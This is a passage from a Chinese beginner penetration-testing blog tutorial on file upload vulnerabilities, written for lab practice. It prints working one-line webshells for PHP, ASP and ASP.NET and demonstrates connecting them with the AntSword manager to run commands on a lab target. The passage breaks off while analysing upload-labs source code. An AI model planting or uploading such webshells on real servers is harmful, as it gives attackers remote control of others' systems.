<div class="article_content clearfix" id="article_content">
<link href="style.css" rel="stylesheet"/>
<div class="markdown_views prism-atom-one-dark" id="content_views">
<svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
<path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
</svg>
<p>大家好！<br/> 我是小黄，很高兴又跟大家见面啦 ！<br/> 拒绝水文，从我做起 ！！！！<br/> <font color="#dd0000">未经允许，禁止转载 ，违者必究！！！！ </font><br/> <font color="#dd0000"> 本实验仅适用于学习和测试 ，严禁违法操作 ！ ！ ！</font><br/> 今天更新的是：</p>
<ul><li>P7 漏洞类型详解_文件上传漏洞</li><li>往期检索：<a href="https://blog.csdn.net/weixin_44519789/article/details/116405855">小白渗透入门系列 - 目录</a></li><li><strong>微信公众号回复：【<code>文件上传</code>】，即可获取本文全部涉及到的工具。</strong></li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210504213829110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70#pic_center"/></p>
<hr/>
<blockquote>
<p><strong>创建时间</strong>：2021年5月9日<br/> <strong>软件</strong>： MindMaster Pro</p>
</blockquote>
<hr/>
<p></p>
<div class="toc">
<h3>漏洞类型详解_文件上传漏洞</h3>
<ul><li><ul><li><a href="#WebShell___WebShell__19">一、WebShell 与 WebShell 管理工具</a></li><li><ul><li><a href="#11_WebShell__20">1.1 什么叫做WebShell ？</a></li><li><a href="#12_WebShell___28">1.2 WebShell 有什么作用呢 ？</a></li><li><ul><li><a href="#121__29">1.2.1 让我们拿举个例子(一句话木马)来讲：</a></li><li><a href="#122__55">1.2.2 大马有什么作用呢?</a></li></ul>
</li><li><a href="#13_WebShell__PHP__59">1.3 WebShell 之 PHP 一句话木马解读</a></li><li><a href="#14_WebShell__79">1.4 WebShell 之常用的一句话木马</a></li><li><a href="#15_WebShell__92">1.5 WebShell 管理工具</a></li><li><ul><li><a href="#151__WebShell__93">1.5.1 常用 WebShell 管理工具</a></li><li><a href="#152__99">1.5.2 我们来拿中国蚁剑来举例：</a></li></ul>
</li><li><a href="#16__166">1.6 拓展思考</a></li><li><ul><li><a href="#161__170">1.6.1 思考一：</a></li><li><a href="#162__180">1.6.2 思考二：</a></li></ul>
</li></ul>
</li><li><a href="#_186">二、文件上传漏洞概述</a></li><li><ul><li><a href="#21__188">2.1 随处可见的文件上传功能</a></li><li><a href="#22__194">2.2 文件上传功能背后的业务逻辑是什么？</a></li><li><a href="#23__208">2.3 任意文件上传的安全风险</a></li><li><a href="#24__232">2.4 什么是文件上传漏洞</a></li></ul>
</li><li><a href="#_237">三、文件上传漏洞绕过</a></li><li><ul><li><a href="#31__239">3.1 文件上传的验证机制有哪些</a></li><li><ul><li><a href="#311_JavaScript_249">3.1.1 客户端JavaScript验证</a></li><li><ul><li><a href="#3111_JavaScript_344">3.1.1.1 绕过客户端JavaScript验证的方法</a></li></ul>
</li></ul>
</li><li><a href="#32_MIME_366">3.2 服务端MIME类型验证</a></li><li><a href="#33__416">3.3 服务器文件内容验证-文件头</a></li><li><ul><li><a href="#331__424">3.3.1 绕过服务器文件内容验证-文件头</a></li><li><a href="#332__482">3.3.2 如何生成图片木马：</a></li></ul>
</li><li><a href="#34__491">3.4 服务器文件扩展名验证-黑名单</a></li><li><ul><li><a href="#341__499">3.4.1 后缀名大小写绕过</a></li><li><a href="#342__538">3.4.2 修改后缀名绕过?</a></li><li><a href="#343__594">3.4.3 重写绕过</a></li><li><a href="#344__623">3.4.4 特殊可解析后缀绕过</a></li><li><a href="#345_htaccess_629">3.4.5 .htaccess绕过</a></li><li><a href="#346_windos_652">3.4.6 利用操作系统特性-windos</a></li><li><a href="#347_00_694">3.4.7 %00截断</a></li></ul>
</li><li><a href="#35__765">3.5 服务器解析漏洞</a></li><li><ul><li><a href="#351_Apache__771">3.5.1 Apache 解析漏洞</a></li><li><a href="#352_IIS60__774">3.5.2 IIS6.0 漏洞</a></li><li><a href="#353_Nginx__785">3.5.3 Nginx 漏洞</a></li><li><a href="#354_Nginx_CVE20134547_793">3.5.4 Nginx 文件名逻辑漏洞（CVE-2013-4547）`了解`</a></li></ul>
</li></ul>
</li><li><a href="#_802">四、文件上传漏洞防御</a></li><li><a href="#_808">五、作者说</a></li></ul>
</li></ul>
</div>
<p></p>
<h2><a id="WebShell___WebShell__19"></a>一、WebShell 与 WebShell 管理工具</h2>
<h3><a id="11_WebShell__20"></a>1.1 什么叫做WebShell ？</h3>
<ul><li>WebShell , 简称网页后门。简单来说它是运行在<code>Web应用之上的远程控制程序</code>。</li><li>webShell其实就是<code>一张网页</code>，由<code>PHP、JSP、ASP、ASP.NET</code>等这类web应用程序语言开发，但webShell并不具备常见网页的功能，例如登录、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息等功能。</li><li><strong>常见的WebShell有哪些？</strong></li><li>大马、小马、各种马…等</li><li>拥有较完整功能的webshell，我们一般称为<code>大马</code>。</li><li>功能简易的webshell称为<code>小马</code>。</li><li>除此之外还存在<code>一句话木马、菜刀马、脱库马</code>等等的名词，是对于webShell功能或者特性的简称。</li></ul>
<h3><a id="12_WebShell___28"></a>1.2 WebShell 有什么作用呢 ？</h3>
<h4><a id="121__29"></a>1.2.1 让我们拿举个例子(一句话木马)来讲：</h4>
<ul><li>在举例之前的呢，我们要做一些前期准备。</li></ul>
<blockquote>
<p><strong>前期准备</strong>：</p>
<ol><li>安装一下集成环境：这里推荐使用 <code>PHPstudy 2018</code>、<code>（PHPstudy 2018 可以在我的微信公众号获取）</code></li><li>安装好环境之后我们来编写一个一句话木马（如何编写我们之后详细讲解）</li><li>写好之后呢，我们进行本地利用。</li></ol>
</blockquote>
<hr/>
<ul><li>首先我来完整的给大家演示一遍</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210509213956588.gif#pic_center"/></p>
<ul><li>掏出我们之前准备好的一句话木马，放在<code>phpStudy\PHPTutorial\WWW</code>目录下</li></ul>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span>
</code></pre>
<ul><li><strong>本地访问：</strong> <code>127.0.0.1/shell.php（我们刚才创建的木马文件名称）</code></li><li>打开<code>HackBar（浏览器插件）</code>：尝试利用这个一句话木马来返回<code>PHPinfo</code>的信息</li><li>构建返回<code>PHPinfo</code>的语句：<code>X=phpinfo();</code>这也是一个任意代码执行，我们通过变量<code>X</code>传递的任何指令都会被当做<code>PHP</code>代码来执行。也可以通过这条指令来调用调用系统函数：<code>X=system(whomai); 、x=system(whomai);</code></li></ul>
<hr/>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210509212655793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210509212747677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210509214730629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<h4><a id="122__55"></a>1.2.2 大马有什么作用呢?</h4>
<ul><li>当我们通过某些操作上传了大马之后，我们可以通过大马来获取目标主机的控制权限、对内网进行扫描、获取内部系统的信息、盗取数据库等等一系列操作。</li><li>我们可以在GitHub上来搜索一些webshell（网上的信息可能存在后门要注意分辨，这里我就不放了）</li></ul>
<h3><a id="13_WebShell__PHP__59"></a>1.3 WebShell 之 PHP 一句话木马解读</h3>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span>
</code></pre>
<ul><li><code>$_POST[x]</code>: 获取 <code>POST</code>请求参数中X的值。例如<code>POST</code>请求中传递 <code>x=phpinfo();</code>，那么 <code>$_POST[x]</code>就等同于<code>phpinfo();</code></li><li><code>eval（）</code>将字符串当做PHP代码去执行。例如 <code>eval('phpinfo();')</code>，其中 <code>phpinfo();</code>会被当做PHP代码去执行。</li></ul>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span>   实际上的传递过程是这样的
			↓
			↓			
			↓
<span class="token delimiter important">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span> 实际的语句是这样的 			
</code></pre>
<ul><li>我们通过该<code>webshell</code>，传递<code>任意PHP代码</code>，让其去执行，从而达到<code>任意代码执行</code>。</li><li>错误控制运算符，当将 <code>@</code>放置在一个PHP表达式之前，该表达式可能产生的任何错误信息都被 <code>忽略</code>掉。</li></ul>
<h3><a id="14_WebShell__79"></a>1.4 WebShell 之常用的一句话木马</h3>
<ul><li>ASP：</li></ul>
<pre><code class="prism language-php"><span class="token operator">&lt;</span><span class="token operator">%</span>eval <span class="token function">request</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"x"</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token operator">&gt;</span>
</code></pre>
<ul><li>ASP.NET：</li></ul>
<pre><code class="prism language-php"><span class="token operator">&lt;</span><span class="token operator">%</span>@ Page Language<span class="token operator">=</span><span class="token double-quoted-string string">"Jscript"</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>eval <span class="token punctuation">(</span>Request<span class="token punctuation">.</span>Item<span class="token punctuation">[</span><span class="token double-quoted-string string">"x"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"unsafe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">&gt;</span>
</code></pre>
<ul><li>这些一句话木马的本质是一样的，不同环境要用不同的一句话木马。</li></ul>
<h3><a id="15_WebShell__92"></a>1.5 WebShell 管理工具</h3>
<h4><a id="151__WebShell__93"></a>1.5.1 常用 WebShell 管理工具</h4>
<ul><li>中国菜地</li><li>中国蚁剑</li><li>冰蝎</li><li>哥斯拉</li><li>…</li></ul>
<h4><a id="152__99"></a>1.5.2 我们来拿中国蚁剑来举例：</h4>
<ul><li>打开中国蚁剑，右键打开<code>添加数据</code></li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210516203425820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>URL地址：就是一句话木马的地址</li><li>链接密码：就是变量X</li><li>编码设置：UTF8</li><li>链接类型：PHP（你用什么一句话木马链接什么类型）</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210516203747470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>测试一下：链接成功</li><li>如果链接失败的话，你是不能进行正常访问的。</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210516203858654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>选择添加就可以看到你链接的数据了</li><li>能够进入到你木马存放的目录了。</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210516203808574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>我们可以尝试着进行增删改查，来实现一些我们想要实现的操作。</li><li>比如说我们创建一个新的目录，<code>猪猪</code></li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210516205037743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210516204934161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>可以查看到刚才新建的</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210516205106713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210516205015542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>比如说我们再创建一个新的目录，<code>1234</code></li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021051620514942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210516205227333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>让我们看看实际演示的过程</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210516212410494.gif#pic_center"/></p>
<ul><li><strong>我们也可以尝试使用一下虚拟终端</strong></li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210516210346576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>打开虚拟终端，输入ipconfig 可以查看一下当前的网络信息</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210516210257905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li><strong>还可以链接数据库</strong></li><li><strong>前提：</strong> 你需要知道数据库的账号和密码</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210516211221496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>还有一个拓展功能，插件市场。</li><li>插件市场里面可以选择安装一些常见的插件。比如说存活扫描之类的等等。</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210516204334835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210516204320504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<h3><a id="16__166"></a>1.6 拓展思考</h3>
<ul><li>我们上面讲了这么多，这个时候有些同学可能就会有疑问了。</li></ul>
<h4><a id="161__170"></a>1.6.1 思考一：</h4>
<ul><li>如果去掉一句话木马中的错误运算符 <code>@</code>会产生怎样的效果呢？</li><li>那我们现在就来尝试一下：</li></ul>
<p><img alt="-" src="https://img-blog.csdnimg.cn/2021051619521098.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>可以看到会出现报错信息。</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210516195753347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<h4><a id="162__180"></a>1.6.2 思考二：</h4>
<ul><li>大马跟小马有什么区别呢？</li><li>小马的代码量小，但是运行的时候需要环境。功能单一且操作复杂。</li><li>大马的功能强大，但是限制多（比如说会有很多限制函数），代码量大。也不是很好用。</li></ul>
<h2><a id="_186"></a>二、文件上传漏洞概述</h2>
<h3><a id="21__188"></a>2.1 随处可见的文件上传功能</h3>
<ul><li>大部分站点都具有 <code>文件上传功能</code>，例如头像更改，文章编辑，附件上传等等。</li></ul>
<p><img alt="-" src="https://img-blog.csdnimg.cn/20210516212840907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<h3><a id="22__194"></a>2.2 文件上传功能背后的业务逻辑是什么？</h3>
<ul><li><strong>文件上传的这个功能是如何实现的呢？</strong></li><li>文件上传功能的作用是将 <code>本地文件上传至服务器上</code>进行保存。</li><li>当我们找到上传的入口，上传文件之后。</li><li>可能会回显文件上传的路径，如果回显了文件上传路径，那么我们就可以根据回显的文件上传路径进行访问，那么我们就可以在浏览器中访问到服务器上的这个文件。</li><li><code>可以尝试用pickchu靶场进行复现。</code></li><li><a href="https://blog.csdn.net/weixin_44519789/article/details/114969948">PikaChu_不安全的文件上传漏洞</a></li><li>这里的复现过程，我就不一一赘述了。感兴趣的大家可以访问上面的链接。</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210516213113886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517220615472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517220917416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<h3><a id="23__208"></a>2.3 任意文件上传的安全风险</h3>
<ul><li> <p><strong>假设文件上传功能没有对上传的文件进行限制，可能会引发哪些安全风险?</strong></p> </li><li> <p>如果是对方是LAMP架构，是否能上传PHP的WebShell到服务端上，然后通过访问上传后的文件地址，从而执行WebShell中的代码。达到控制对方服务器的目的。</p> </li><li> <p><strong>实验演示：</strong></p> </li><li> <p>让我们<code>禁用JS来跳过验证</code>来上传一句话木马</p> </li></ul>
<p><img alt="-    ‘’" src="https://img-blog.csdnimg.cn/20210517222946916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>上传成功之后，尝试访问木马，访问成功之后来验证一下，尝试返回<code>phpinfo</code>的信息。返回信息成功之后，让我们挂上蚁剑。</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517223200631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>来我们尝试来链接上蚁剑，链接上之后就能就能干我们想要的操作了。</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517223826400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021051722384187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517224430189.jpg#pic_center"/></p>
<h3><a id="24__232"></a>2.4 什么是文件上传漏洞</h3>
<ul><li>文件上传漏洞是指文件上传功能<code>没有对上传的文件做合理严谨的过滤</code>，导致用户可以利用此功能，上传能<code>被服务端解析执行的文件</code>，并通过此文件获得<code>执行服务端命令的能力</code>。</li></ul>
<p><img alt="-" src="https://img-blog.csdnimg.cn/20210516220802558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<h2><a id="_237"></a>三、文件上传漏洞绕过</h2>
<ul><li><a href="https://blog.csdn.net/qq_32448559/article/details/81667309">环境准备：upload-labs 靶场的安装与配置教程</a></li></ul>
<h3><a id="31__239"></a>3.1 文件上传的验证机制有哪些</h3>
<ul><li><strong>客户端JavaScript验证</strong></li></ul>
<p><img alt="-" src="https://img-blog.csdnimg.cn/20210516222313216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li><strong>服务端MIME类型验证</strong></li><li><strong>服务端文件扩展名验证（ 黑名单、 白名单 ）</strong></li><li><strong>服务器文件内容验证 （ 文件头(文件幻数) 、文件加载检测 ）</strong></li></ul>
<h4><a id="311_JavaScript_249"></a>3.1.1 客户端JavaScript验证</h4>
<ul><li><strong>目的：</strong> 对上传文件的文件格式进行一个验证</li><li><strong>客户端JavaScript验证验证的机制</strong></li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517225253288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<hr/>
<ul><li><code>打开upload-labs 靶场第一题 - JS检查</code></li><li><strong>源码分析</strong></li></ul>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token single-quoted-string string">'../config.php'</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token single-quoted-string string">'../head.php'</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token single-quoted-string string">'../menu.php'</span><span class="token punctuation">;</span>

<span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token comment">//取出文件上传后临时存储的文件名</span>
        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token comment">//生成一个新的文件存储路径，文件名保持文件上传前的文件名</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token comment">//move_uploaded_file函数把上传的文件移动到新的位置，成功则返回true，失败则返回false</span>
            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span>

</code></pre>
<ul><li>这里先是包含几个文件，然后出现了一些新的函数</li><li><code>file_exists</code>函数检查文件或目录是否存在。<code>如果指定的文件或目录存在则返回 TRUE，否则返回 FALSE。</code></li><li>而<code>UPLOAD_PATH</code>这个常量在<code>config.php</code>文件中，有这么一段代码<code>define("UPLOAD_PATH", "../upload");</code>，进行了设置。</li><li>那这个<code>$_FILES['upload_file']['tmp_name']</code>又是哪儿冒出来的呢，<code>upload_file</code>就是文件上传的表单的名字,如下图</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210522171427878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li><strong>这里是<code>$_FILES</code>中的那些参数：</strong></li></ul>
<pre><code class="prism language-php"><span class="token variable">$_FILES</span>这个变量用与上传的文件参数设置，是一个多维数组
数组的用法就是 <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
